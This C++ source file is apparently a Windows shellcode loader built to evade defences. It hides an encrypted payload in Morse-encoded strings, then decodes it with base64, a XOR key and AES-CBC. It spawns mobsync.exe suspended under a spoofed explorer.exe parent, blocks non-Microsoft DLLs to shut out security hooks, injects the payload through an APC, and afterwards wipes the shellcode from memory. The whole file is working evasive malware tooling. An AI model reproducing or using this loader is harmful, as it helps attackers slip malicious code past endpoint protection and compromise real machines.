#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"
#include "low.h"
#include <string>
#include <map>
#include <sstream>

using namespace std;

map< char, string > trncbstd =
{
{'a',".-"},{'A',"^.-"},{'b',"-..."},{'B',"^-..."},{'c',"-.-."},{'C',"^-.-."},{'d',"-.."},{'D',"^-.."},{'e',"."},{'E',"^."},{'f',"..-."},{'F',"^..-."},{'g',"--."},{'G',"^--."},{'h',"...."},{'H',"^...."},{'i',".."},{'I',"^.."},{'j',".---"},{'J',"^.---"},{'k',"-.-"},{'K',"^-.-"},{'l',".-.."},{'L',"^.-.."},{'m',"--"},{'M',"^--"},{'n',"-."},{'N',"^-."},{'o',"---"},{'O',"^---"},{'p',".--."},{'P',"^.--."},{'q',"--.-"},{'Q',"^--.-"},{'r',".-."},{'R',"^.-."},{'s',"..."},{'S',"^..."},{'t',"-"},{'T',"^-"},{'u',"..-"},{'U',"^..-"},{'v',"...-"},{'V',"^...-"},{'w',".--"},{'W',"^.--"},{'x',"-..-"},{'X',"^-..-"},{'y',"-.--"},{'Y',"^-.--"},{'z',"--.."},{'Z',"^--.."},{'0',"-----"},{'1',".----"},{'2',"..---"},{'3',"...--"},{'4',"....-"},{'5',"....."},{'6',"-...."},{'7',"--..."},{'8',"---.."},{'9',"----."},{'/',"/"},{'=',"...^-"},{'+',"^.^"},{'!',"^..^"},
};

void beuumwgq(std::string const& str, const char qgeyoafjxlbde,
    std::vector<std::string>& out)
{
    // construct a stream from the string 
    std::stringstream ss(str);

    std::string s;
    while (std::getline(ss, s, qgeyoafjxlbde)) {
        out.push_back(s);
    }
}

string ixgwuhogveo(string mpcxflnjdslerd)
{
    string snsqcqwdahehbn;

    //morse to ascii
    std::vector<std::string> lwclplvhccs;
    beuumwgq(mpcxflnjdslerd, ' ', lwclplvhccs);
    for (int s = 0; s < lwclplvhccs.size(); s++) {
        for (auto it = trncbstd.rbegin(); it != trncbstd.rend(); it++) {
            if (lwclplvhccs[s] == it->second)
            {
                snsqcqwdahehbn.push_back(it->first);
            }
        }
    }
    return snsqcqwdahehbn;
}

// This is just directly stolen from ired.team
DWORD uyhmresy() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}

//reffered to alaris
void axmfdtsf(std::vector<byte> ewweklqqpay)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD tfqyqpii;
    DWORD jocimobisdgv;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize custom startup objects for CreateProcess()
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);

    // Disallow non-microsoft signed DLL's from hooking/injecting into our CreateProcess():
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 svmomkchxvngtv = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &svmomkchxvngtv, sizeof(svmomkchxvngtv), NULL, NULL);

    // Mask the PPID to that of explorer.exe
    HANDLE heayqeoppc = OpenProcess(PROCESS_ALL_ACCESS, false, uyhmresy());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &heayqeoppc, sizeof(HANDLE), NULL, NULL);

    LPCWSTR hqceqrgvdn = L"C:\\Windows\\System32\\mobsync.exe";

    if (!CreateProcess(
        hqceqrgvdn,			// LPCWSTR Command (Binary to Execute)
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        FALSE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "whoops " << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1400);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = nullptr;
    SIZE_T eclfsfvawru = ewweklqqpay.size();
    NtAllocateVirtualMemory(hProcess, &mem, 0, (PSIZE_T)&eclfsfvawru, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(hProcess, mem, ewweklqqpay.data(), ewweklqqpay.size(), 0);
    NtQueueApcThread(hThread, (PKNORMAL_ROUTINE)mem, mem, NULL, NULL);
    NtResumeThread(hThread, NULL);

    // Overwrite shellcode with null bytes
    Sleep(9999);
    uint8_t juiqmxhhl[500];
    NtWriteVirtualMemory(hProcess, mem, juiqmxhhl, sizeof(juiqmxhhl), 0);
}
int main()
{
    //implement privilege escalation here
    //https://github.com/KooroshRZ/Windows-DLL-Injector/blob/61f30f3a9750600d09a19761515892e4582ec434/Injector/src

    // Disallow non-MSFT signed DLL's from injecting
    PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY sp = {};
    sp.MicrosoftSignedOnly = 1;
    SetProcessMitigationPolicy(ProcessSignaturePolicy, &sp, sizeof(sp));

    std::vector<uint8_t> vgsftwjnjsccy, ewweklqqpay;
    std::string mpcxflnjdslerd, tgxyhxie, guepawru, tgisrygboh, rcklltkllhbel, mpcxflnjdslerdtgisrygboh, mpcxflnjdslerdrcklltkllhbel, mpcxflnjdslerdaoaegbtcgmos, aoaegbtcgmos;
    base64 b64 = base64();

    //xor
    mpcxflnjdslerd = "^.-.. ^-. ^... -- ^.^ . .... ^... ^.. ..-. -.-. ^-.-- ^.. - ----- ---.. ----- ^.. -. ^... -.. ^-.. -... --... ^- --.. ^-- .-.. ...- ..-. ^.--. ^--.. ^-.-. ---.. ..-. -- --.- . --... ^.- -... ^-..- --.. ..... ^.... ^--.- -. ^...- ^. ^.--. .- ^.^ .... --.. ^.... ... - ^.- --- ^.. ^-..- . ...-- ^--.. -... -.. .-- -.-- -.... ..- ^-.-. .--- .-. .. ... ^..-. ..-. -- - -... --.- .---- --.. ^-.- ^.-.. --... ----- -.- ^.--. ^--. ^... -. -.-. -.- .. - .-. ^-. ..... ^.... -... ^.--- ^-- -.-- ^..- --... ----. ..--- ...- ^-.-- ^-.-. ----. ----- .... .-. ^--.. .---- ^-. ----- ---.. .--- .---- ^-.- -.... ^--. ^- ^--.- ..... ^..- ^.-. ^--- -.-- ^.... ^- ^...- ^.-.. .--- ^... ^.-. ...-- ^-.- ^--- ^-.. ^-. - .-. -.-. --.- -.-- -.- ---.. ^- ^.... ... .. . .... ^- -.-. .--. -.-. ..-. / ^--- ..-. -- ^.-.. ..--- ...-- ^.-- . ---.. ^-.. --.- ---.. .---- ..--- --.- --... ^-- ^.... ----- ^.. --.. ^-.. ^.--- ^.. ^.-- ^.-. ^..-. ----. .. ^--.. -.- --.- --- .- ^-.. .--- ----. ^.^ ^--.. ^..- ^.^ .... ^.-. ... --.- --. -.. ....- ..- --.. ^-.. ^-- ^-.-. ^..- --... --.- .--- ... / ..- -.-. ....- -.... ^-.. -. ..-. .... ....- ^..-. .- --.- ...- -. -... .--. ^... ^...- ^...- -.-- ^.. ^- ^- -- ..... ^--.. ..-. .-.. -.... .- ^.- .- ^-.. .---- ^--.- -... ... ..... ^-.-- ....- ^- ^-..- ^.. ^--. -.. ^... ^-.. ^.--. . ^. ^.^ ...- -... ..--- .. ^..-. ^-- ^...- ^- ----- .--- -.... ^..-. -..- -.- ^--.- / ^.^ ^.-. --.- ^--. / ^--- --- ..-. --... ^.--- ^.. ^..- --- ..- ^- ^-.-. ^.-.. ^... ^.- ^--. ^.-. ^-.-- ---.. ----. ^--. --... - ----- ^.-- -.. ^.-.. ^- --.- ^..- ^..-. / ...- ^.-.. ^.-. --- -.... --.- ^-.- -.... ^-..- .--. .-. ^-. .. ----- .- --. ^..- .- ^-- --- .-- -.-- ----. .. ^--- .-. .- --.. ... ----- ..... --- ----- --.- ----. ^--.. .. ^.--. ^-- ^...- ^--.. -- --... ----- ^--.. .--- - -. ^.^ -.... ^.^ -.-- .--- ... --. .... -.-. - ^-. ";
    mpcxflnjdslerdtgisrygboh = "^--.- -.. ....- ^-.. ..... ...-- ^--- ...- ^.-- ..- ^.... .- ....- ^-.-- ^-.- --... ...-- ^.-- -.- ^-.-. ^.-. ..--- ^..-. ..--- ^-. ^.- --.. --. ^.... ^.--. ----. ..--- . . .. -.. --... ^--.- .---- -..- ^.--- ^--.- ^. ...^- ";
    mpcxflnjdslerdrcklltkllhbel = "--.. ^.--. - ^..- . .... -. ...-- ^.. .---- -.- -... ^.. ^..-. ^-.-- ^--- ^.--. -.- --.. ^.-.. ... --. ...^- ...^- ";
    mpcxflnjdslerdaoaegbtcgmos = "^..^ .. ----- --... ^.--. ---.. ^--.- ..-. ^-.-. ^-.-. .--- -- --... --.. -.... .---- ^.--. ^-.- ";

    //translate all sumarine language
    tgxyhxie = ixgwuhogveo(mpcxflnjdslerd);
    tgisrygboh = ixgwuhogveo(mpcxflnjdslerdtgisrygboh);
    rcklltkllhbel = ixgwuhogveo(mpcxflnjdslerdrcklltkllhbel);
    aoaegbtcgmos = ixgwuhogveo(mpcxflnjdslerdaoaegbtcgmos);

    guepawru = b64.base64_decode(tgxyhxie);

    //xor
    //char vnsbsddtmamsd[] = "Sup3rS3cur3K3yfTw!";
    //initialize aoaegbtcgmos in a weird way
    char vnsbsddtmamsd[19];
    for (int k = 0; k < aoaegbtcgmos.length(); k++) vnsbsddtmamsd[k] = aoaegbtcgmos[k];

    int j = 0;
    for (int i = 0; i < guepawru.size(); i++) {
        if (j == sizeof vnsbsddtmamsd - 1) j = 0;

        guepawru[i] = guepawru[i] ^ vnsbsddtmamsd[j];
        j++;
    }

    vgsftwjnjsccy.clear();
    std::copy(guepawru.begin(), guepawru.end(), std::back_inserter(vgsftwjnjsccy));

    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t key[32];
    uint8_t iv[16];
    string a3s_key = b64.base64_decode(tgisrygboh);
    string a3s_iv = b64.base64_decode(rcklltkllhbel);
    std::copy(a3s_key.begin(), a3s_key.end(), std::begin(key));
    std::copy(a3s_iv.begin(), a3s_iv.end(), std::begin(iv));

    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, vgsftwjnjsccy.data(), vgsftwjnjsccy.size());
    ewweklqqpay.clear();

    // Remove the padding from the decypted plaintext
    SIZE_T c_size = vgsftwjnjsccy.size();
    for (int i = 0; i < c_size; i++)
    {
        if (vgsftwjnjsccy[i] == 0x90 && i == (c_size - 1))
        {
            break;
        }
        else if (vgsftwjnjsccy[i] == 0x90 && vgsftwjnjsccy[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            ewweklqqpay.push_back(vgsftwjnjsccy[i]);
        }
    }

    //process hollowing + ptfqyqpii spoofing
    axmfdtsf(ewweklqqpay);
}

